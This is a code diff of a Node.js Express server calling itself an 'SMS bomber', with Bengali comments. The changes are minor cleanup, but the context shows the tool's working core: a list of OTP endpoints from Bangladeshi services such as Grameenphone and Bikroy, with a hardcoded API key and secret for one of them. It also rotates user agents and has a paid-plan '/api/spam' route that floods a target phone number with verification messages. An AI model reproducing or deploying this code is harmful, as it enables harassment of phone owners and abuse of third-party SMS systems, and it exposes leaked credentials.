@@ -1,8 +1,18 @@
 // ============================================================
-// ULTIMATE POWERFUL SMS BOMBER V5.0
-// সম্পূর্ণ ফিক্সড কোড - Render এর জন্য অপটিমাইজড
+// ULTIMATE POWERFUL SMS BOMBER V5.0 - Render Optimized
 // Developer: TNEH GROUP
 // ============================================================
+
+// ============================================================
+// IMPORTANT: Check if dependencies are installed
+// ============================================================
+try {
+  require.resolve('express');
+} catch (e) {
+  console.error('❌ Express not found! Please run: npm install');
+  console.error('   Or check your package.json dependencies');
+  process.exit(1);
+}
 
 const express = require('express');
 const axios = require('axios');
@@ -14,6 +24,10 @@ const crypto = require('crypto');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+
+console.log(`🚀 Starting SMS Bomber V5.0 on port ${PORT}`);
+console.log(`📁 Current directory: ${__dirname}`);
+console.log(`📦 Node version: ${process.version}`);
 
 // ============================================================
 // মিডলওয়্যার
@@ -95,21 +109,12 @@ const Utility = {
     return arr;
   },
 
-  chunkArray: (arr, size) => {
-    const chunks = [];
-    for (let i = 0; i < arr.length; i += size) {
-      chunks.push(arr.slice(i, i + size));
-    }
-    return chunks;
-  },
-
   getMemoryUsage: () => {
     const usage = process.memoryUsage();
     return {
       rss: (usage.rss / 1024 / 1024).toFixed(2) + ' MB',
       heapTotal: (usage.heapTotal / 1024 / 1024).toFixed(2) + ' MB',
-      heapUsed: (usage.heapUsed / 1024 / 1024).toFixed(2) + ' MB',
-      external: (usage.external / 1024 / 1024).toFixed(2) + ' MB'
+      heapUsed: (usage.heapUsed / 1024 / 1024).toFixed(2) + ' MB'
     };
   }
 };
@@ -123,9 +128,7 @@ const USER_AGENTS = [
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36'
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0'
 ];
 
 function getRandomHeaders() {
@@ -149,7 +152,6 @@ const CONFIG = {
   timeout: 8000,
   maxRetries: 3,
   retryDelay: 200,
-  cacheTTL: 300,
   maxCountPerAPI: 100,
   stopCheckInterval: 50
 };
@@ -370,7 +372,6 @@ class BombController {
 // API ডেফিনেশন - 160 টি API
 // ============================================================
 const ORIGINAL_APIS = [
-  // GET APIs (1-8)
   { id: 1, name: "Bikroy.com", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}" },
   { id: 2, name: "Grameenphone MyGP", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0" },
   { id: 3, name: "Shukhee.com", method: "GET", url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn" },
@@ -379,8 +380,6 @@ const ORIGINAL_APIS = [
   { id: 6, name: "eCourier API", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
   { id: 7, name: "Binge.buzz (GET)", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
   { id: 8, name: "Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
-  
-  // POST APIs (9-49)
   { id: 9, name: "Deshal.net", method: "POST", url: "https://app.deshal.net/api/auth/login", body: {"phone": "{phone}"} },
   { id: 10, name: "Grameenphone Web Login", method: "POST", url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: {"msisdn": "{phone}"} },
   { id: 11, name: "Grameenphone (FWA/Bkash)", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: {"phone": "{phone}", "email": "", "language": "en"} },
@@ -422,8 +421,6 @@ const ORIGINAL_APIS = [
   { id: 47, name: "Quizgiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", body: {"country_code": "+880", "phone": "{phone}"} },
   { id: 48, name: "Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
   { id: 49, name: "Bioscopelive (Alternative)", method: "POST", url: "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
-  
-  // ShadowX API (50)
   { id: 50, name: "ShadowX API", method: "GET", url: "https://shadowx-api.onrender.com/api/bm?num={phone}&count={count}", isShadowX: true }
 ];
 
@@ -714,7 +711,6 @@ app.get('/api/spam', async (req, res) => {
   const startTime = Date.now();
   const { plan, number, count = 1, key } = req.query;
   
-  // প্ল্যান সিলেক্ট
   let currentPlan = 'default';
   let planConfig = PLAN_CONFIG.default;
   
@@ -723,7 +719,6 @@ app.get('/api/spam', async (req, res) => {
     planConfig = PLAN_CONFIG[plan];
   }
   
-  // প্রিমিয়াম চেক
   if (planConfig.requiresKey) {
     if (!key || !isKeyValid(key)) {
       return res.status(401).json({
@@ -736,7 +731,6 @@ app.get('/api/spam', async (req, res) => {
     }
   }
   
-  // নম্বর ভ্যালিডেশন
   if (!number) {
     return res.status(400).json({
       success: false,
@@ -755,7 +749,6 @@ app.get('/api/spam', async (req, res) => {
     });
   }
   
-  // কাউন্ট ভ্যালিডেশন
   let perApiCount = parseInt(count);
   if (isNaN(perApiCount) || perApiCount < 1) perApiCount = 1;
   if (perApiCount > planConfig.maxCount) {
@@ -769,7 +762,6 @@ app.get('/api/spam', async (req, res) => {
     });
   }
   
-  // জব রেজিস্টার
   const totalSMS = SMS_APIS.length * perApiCount;
   const jobId = bombController.registerJob(cleanNumber, totalSMS, {
     plan: currentPlan,
@@ -778,7 +770,6 @@ app.get('/api/spam', async (req, res) => {
   
   console.log(`📱 [${currentPlan.toUpperCase()}] JOB ${jobId}: ${perApiCount}x${SMS_APIS.length} SMS to ${Utility.maskPhone(cleanNumber)}`);
   
-  // অ্যাসিঙ্ক্রোনাস প্রসেসিং
   (async () => {
     try {
       const results = await sendBatch(SMS_APIS, cleanNumber, perApiCount, jobId);
@@ -1073,19 +1064,6 @@ app.get('/api/health', (req, res) => {
   });
 });
 
-// ===== ক্লিনআপ =====
-app.get('/api/cleanup', (req, res) => {
-  const cleaned = bombController.clearCompleted();
-  
-  res.json({
-    success: true,
-    message: 'Cleanup completed',
-    developer: DEVELOPER_INFO,
-    completed_jobs_cleared: cleaned,
-    timestamp: Utility.getISOString()
-  });
-});
-
 // ===== 404 হ্যান্ডলার =====
 app.use((req, res) => {
   res.status(404).json({
@@ -1104,8 +1082,7 @@ app.use((req, res) => {
       '/api/checkkey',
       '/api/apis',
       '/api/stats',
-      '/api/health',
-      '/api/cleanup'
+      '/api/health'
     ]
   });
 });
